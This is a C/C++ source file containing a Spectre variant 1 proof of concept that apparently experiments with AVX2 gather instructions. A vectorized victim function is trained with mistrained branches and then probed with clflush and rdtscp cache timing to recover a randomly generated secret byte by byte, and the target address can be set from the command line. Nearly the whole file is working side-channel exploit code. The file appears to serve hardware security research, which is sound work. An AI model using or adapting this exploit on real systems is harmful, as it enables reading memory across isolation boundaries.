#pragma GCC optimize("O0","unroll-loops","omit-frame-pointer","inline") //Optimization flags
#pragma GCC option("arch=native","tune=native","no-zeroupper") //Enable AVX
#pragma GCC target("avx", "avx2", "sse", "sse2", "sse3", "ssse3")  //Enable AVX
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#include <immintrin.h>
#endif
#include <bits/stdc++.h> //All main STD libraries

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
const int L = 256;
const int V = L / 16;
uint8_t unused1[64];
int array1[160] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16};
uint8_t unused2[64];
uint8_t array2[256 * 2048];

__attribute__((optimize("no-tree-vectorize"))) //Force disable auto-vectorization

uint32_t secret[80];
__m128i __attribute__((aligned(8))) vectorized[V]; //Vectorized array

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

__m256i temp_vector;
__m256i sll_256 = _mm256_set_epi32(11, 11, 11, 11, 11, 11, 11, 11);

void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 2048];
    }
}

void victim_function_vector(size_t x)
{
    if (x < array1_size)
    {
        if (x % 8 == 0)
            temp_vector = _mm256_i32gather_epi32(array2, _mm256_load_si256((__m256i *)&array1[x]), 1);
        else
            temp_vector = _mm256_i32gather_epi32(array2, _mm256_loadu_si256((__m256i *)&array1[x]), 1);
    }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

void readMemoryVector(size_t malicious_x, uint8_t value[20], int score[20], size_t malicious_a[20])
{
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0, temp;
    size_t training_x, x, a[20];
    register uint64_t time1, time2, time3, time4;
    volatile uint8_t *addr;

    //time3 = __rdtscp((uint32_t *)(&junk));
    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {
        //printf("tries = %d\n", tries);
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256 * 2048 / 64; i++)
            _mm_clflush(&array2[i * 64]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = (tries % array1_size) / 8 * 8;
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++)
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            //for (k = 0; k < 20; k++)
            {
                x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
                x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
              //  printf("x = %d\n", x);
                x = training_x ^ (x & (malicious_x ^ training_x));
            }
            
            /* Call the victim! */
            //printf("j = %d\nx = %d\n", j, x);
            victim_function_vector(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 2048];
            time1 = __rdtscp((uint32_t *)(&junk));         /* READ TIMER */
            junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp((uint32_t *)(&junk)) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

    }
    for (i = 0; i < 20; i++)
    {
        value[i] = 0;
        score[i] = 0;
    }
    for (i = 0; i < 256; i++)
    {
        if (results[i] > score[19])
        {
            value[19] = (uint8_t)i;
            score[19] = results[i];
        }
        for (j = 18; j >= 0; j--)
        {
            if (score[j + 1] > score[j])
            {
                temp = score[j];
                score[j] = score[j + 1];
                score[j + 1] = temp;
                temp = value[j];
                value[j] = value[j + 1];
                value[j + 1] = temp;
            }
        }
    }
    //time4 = __rdtscp((uint32_t *)(&junk)) - time3;
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
}

void generate_secret()
{
    // let secret first between 33 to 126 to make it visible
    // then mul 2048 to avoid spatial locality
    int x, y, z;
    bool b[127];
    memset(b, false, sizeof(b));
    srand(time(0));
    for (int i = 0; i < 98; i++)
        printf("*");
    printf("\n");
    printf("Secret Generated: ");
    for (int i = 0; i < 80; i++)
    {
        x = rand() % 32767;
        y = rand() % 32767;
        z = (x * y) % 94 + 33;
        while (b[z])
        {
            z++;
            if (z >= 127)
                z = 33;
        }
        b[z] = true;
        secret[i] = z;
        printf("%c", secret[i]);
        secret[i] *= 2048;
    }
    printf("\n");
    for (int i = 0; i < 98; i++)
        printf("*");
    printf("\n");
    
}

int main(int argc,
         const char **argv)
{
    generate_secret();
    size_t a[20];
    size_t malicious_x = (size_t)(secret - (uint32_t *)array1); /* default for malicious_x */
    int base_addr = malicious_x;
    int i, score[20], len = 2;
    uint8_t value[20];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3)
    {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }

    //testvector(malicious_x);
    
    unsigned int junk = 0;
    register uint64_t time1, time2, time3, time4;

    time3 = __rdtscp(&junk);
    printf("Reading %d bytes:\n", len);
    int offset = 0;
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p... \n", (void *)malicious_x);
        printf("A: %p\n", (size_t)(&secret[0] - (uint32_t *)array1));
        printf("B: %p\n", (size_t)(&secret[1] - (uint32_t *)array1));
        printf("addr1: %p\n", &secret[0]);
        printf("addr2: %p\n", &secret[1]);
        printf("addr3: %p\n", &array1[0]);
        printf("addr4: %p\n", &array1[1]);
        //readMemoryByte(malicious_x++, value, score);
        for (i = 0; i < 16; i++)
            a[i] = malicious_x + i;
        //temp_vector = _mm256_loadu_si256((__m256i*) &array1[1]);
        //temp_vector = _mm256_i32gather_epi32(array2, temp_vector, 1);
        readMemoryVector(malicious_x, value, score, a);
        /*printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : 0), score[0]);
        if (score[1] > 0)

            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");*/
        for (i = 0; i < 20; i++)
            printf("0x%02X=’%c’ score=%d \n", value[i],
               (value[i] > 31 && value[i] < 127 ? value[i] : '?'), score[i]);
        malicious_x += 1;
    }
    time4 = __rdtscp(&junk) - time3;
    printf("Time = %llu\n", time4);
    return (0);
}
/*
gcc -march=native -fopt-info-vec-optimized test256.cpp -o test256 -lstdc++ -lm
*/

